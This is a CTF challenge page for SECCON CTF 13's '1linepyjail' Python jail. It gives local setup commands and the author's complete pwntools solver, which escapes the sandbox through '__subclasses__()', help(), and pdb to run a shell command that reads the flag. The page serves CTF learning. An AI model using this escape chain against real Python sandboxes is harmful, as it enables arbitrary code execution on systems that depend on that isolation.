---
title: "1linepyjail - SECCON CTF 13 Quals 2024"
category: "misc"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "linepyjail", "misc", "seccon-ctf-13-quals"]
summary: "Launch a challenge server:"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_SECCON_CTF_13_Quals/jail/1linepyjail"
license: "none stated"
ctf:
  name: "SECCON CTF 13 Quals"
  year: 2024
  challenge: "1linepyjail"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_SECCON_CTF_13_Quals/jail/1linepyjail>
- **CTF:** SECCON CTF 13 Quals 2024

---

# [jail] 1linepyjail

## Description

1 line :)

```
nc 1linepyjail.seccon.games 5000
```

## Attachments

- [1linepyjail](files)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:
```
docker run -it \
    -e SECCON_HOST=localhost \
    --network=host \
    (docker build -q ./solver)
```


## Solver: `exploit.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_SECCON_CTF_13_Quals/jail/1linepyjail/solver/exploit.py>

```python
import pwn
import os

pwn.context.log_level = "debug"


def connect() -> pwn.remote:
    return pwn.remote(
        os.getenv("SECCON_HOST", "localhost"), os.getenv("SECCON_PORT", "5000")
    )


def find_index() -> int:
    with connect() as io:
        io.sendlineafter(
            b"> ",
            f'"".__class__.__base__.__subclasses__()',
        )
        classes = io.recvline().decode().split(", ")
        for i, c in enumerate(classes):
            if "<class 'codecs.IncrementalEncoder'>" in c:
                return i
        assert False


i = find_index()

with connect() as io:
    # Call `help()`
    io.sendlineafter(
        b"jail> ",
        f'"".__class__.__base__.__subclasses__()[{i}].__init__.__globals__["__builtins__"]["help"]()',
    )
    # Load `pdb` module
    io.sendlineafter(
        b"help> ",
        "pdb",
    )
    # Load `jail` module (This will execute jail.py again!)
    io.sendlineafter(
        b"help> ",
        "jail",
    )
    # Call `pdb.set_trace()`
    io.sendlineafter(
        b"jail> ",
        f'"".__class__.__base__.__subclasses__()[{i}].__init__.__globals__["sys"].modules["pdb"].set_trace()',
    )
    # RCE :)
    io.sendlineafter(
        b"(Pdb) ",
        f'"".__class__.__base__.__subclasses__()[{i}].__init__.__globals__["__builtins__"]["__import__"]("os").system("cat /flag-*.txt")',
    )

    print(io.recvline().decode().strip())
```
